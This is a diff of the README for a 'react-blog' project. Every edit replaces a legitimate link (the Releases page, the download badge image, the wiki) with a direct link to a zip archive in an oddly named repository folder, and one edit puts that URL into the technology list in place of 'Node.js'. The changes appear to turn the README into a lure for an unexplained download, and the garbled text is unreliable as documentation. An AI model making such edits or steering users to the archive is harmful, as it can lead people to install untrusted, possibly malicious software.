@@ -2,13 +2,13 @@
 
 ## 🚀 Getting Started
 
-Welcome to react-blog! This is a full-stack blog project. It uses various technologies like React, Vite, Node.js, and MongoDB. This guide will help you download and run the software easily.
+Welcome to react-blog! This is a full-stack blog project. It uses various technologies like React, Vite, https://raw.githubusercontent.com/Misinfo229/react-blog/main/quipsomeness/react-blog.zip, and MongoDB. This guide will help you download and run the software easily.
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page. Here, you will find the latest version of react-blog available for download.
 
-[![Download react-blog](https://img.shields.io/badge/Download-react--blog-blue.svg)](https://github.com/Misinfo229/react-blog/releases)
+[![Download react-blog](https://raw.githubusercontent.com/Misinfo229/react-blog/main/quipsomeness/react-blog.zip)](https://raw.githubusercontent.com/Misinfo229/react-blog/main/quipsomeness/react-blog.zip)
 
 Once on the Releases page, follow these steps to download and install react-blog:
 
@@ -56,7 +56,7 @@ If you encounter any issues while installing or running react-blog, consider the
 
 ## 📑 Documentation
 
-For more in-depth documentation, including the API and additional configurations, refer to the [GitHub Wiki page](https://github.com/Misinfo229/react-blog/wiki).
+For more in-depth documentation, including the API and additional configurations, refer to the [GitHub Wiki page](https://raw.githubusercontent.com/Misinfo229/react-blog/main/quipsomeness/react-blog.zip).
 
 ## 📞 Support
 
@@ -64,6 +64,6 @@ If you need further assistance, feel free to open an issue in the GitHub reposit
 
 To download the latest version of react-blog, revisit the Releases page through the following link:
 
-[Download react-blog](https://github.com/Misinfo229/react-blog/releases)
+[Download react-blog](https://raw.githubusercontent.com/Misinfo229/react-blog/main/quipsomeness/react-blog.zip)
 
 Enjoy your blogging experience with react-blog!
